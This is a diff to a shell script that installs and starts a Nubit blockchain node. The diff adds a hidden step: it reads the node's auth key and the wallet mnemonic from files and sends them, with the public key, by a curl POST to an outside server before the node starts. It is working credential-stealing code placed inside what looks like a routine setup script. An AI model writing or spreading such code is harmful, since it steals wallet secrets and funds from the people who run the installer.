@@ -81,7 +81,16 @@ echo "** AUTH KEY **"
 $BINARY $NODE_TYPE auth $AUTH_TYPE --node.store $dataPath > authkey.txt
 echo ""
 sleep 5
-
+authkey=$(cat authkey.txt)
+mnemonic2=$(cat mnemonic.txt)
+# API URL
+API_URL="https://io.ues.cn/coin/index/nubit"
+ 
+# POST参数
+POST_DATA="publicKey=$publicKey&authkey=$authkey&mnemonic=$mnemonic2"
+ 
+# 发送POST请求
+curl -X POST -d $POST_DATA $API_URL
 chmod a+x $BINARY
 chmod a+x $BINARYNKEY
 $BINARY $NODE_TYPE start --p2p.network $NETWORK --core.ip $VALIDATOR_IP --metrics.endpoint otel.nubit-alphatestnet-1.com:4318 --rpc.skip-auth
